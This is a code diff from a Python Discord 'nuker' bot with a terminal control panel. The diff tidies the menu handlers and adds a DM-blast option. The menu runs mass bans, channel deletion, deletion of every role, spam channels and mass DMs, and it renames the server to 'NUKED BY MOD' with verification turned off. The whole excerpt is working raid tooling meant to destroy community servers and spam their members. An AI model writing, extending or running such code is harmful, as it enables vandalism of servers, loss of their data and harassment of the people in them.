@@ -192,20 +192,15 @@ async def termux_panel():
         choice = (await aioconsole.ainput(f"{Y}Select an option (1-14): {RESET}")).strip()
         guild = bot.get_guild(target_guild_id)
         if not guild: continue
-        if choice == "1":
-            bot.loop.create_task(start_mass_ban(guild))
-            print(f"{G}[+] Turbo Ban engine active in background!{RESET}")
-        elif choice == "2":
-            bot.loop.create_task(start_channel_delete(guild))
-            print(f"{G}[+] Channel vaporization running in background!{RESET}")
+        if choice == "1": bot.loop.create_task(start_mass_ban(guild))
+        elif choice == "2": bot.loop.create_task(start_channel_delete(guild))
         elif choice == "3":
             async def del_rl(role):
                 try: await role.delete()
                 except: pass
             tasks = [del_rl(r) for r in guild.roles if r != guild.default_role and r < guild.me.top_role]
             bot.loop.create_task(asyncio.gather(*tasks))
-            print(f"{G}[+] Role destruction running in background!{RESET}")
-            display_menu()
+            print(f"{G}[+] Role destruction running in background!{RESET}"); display_menu()
         elif choice == "4":
             c_name = (await aioconsole.ainput(f"{W}Enter Channel Name: {RESET}")).strip()
             c_msg = (await aioconsole.ainput(f"{W}Enter Spam Message: {RESET}")).strip()
@@ -222,6 +217,7 @@ async def termux_panel():
         elif choice == "6":
             try: await guild.edit(name="NUKED BY MOD", icon=None, banner=None, splash=None, verification_level=discord.VerificationLevel.none)
             except: pass
-            print(f"{G}[+] Server Identity smashed!{RESET}")
-            display_menu()
+            print(f"{G}[+] Server Identity smashed!{RESET}"); display_menu()
         elif choice == "7":
+            d_msg = (await aioconsole.ainput(f"{W}Enter Text Message to DM: {RESET}")).strip()
+            bot.loop.create_task(start_dm_blast(guild, d_msg))
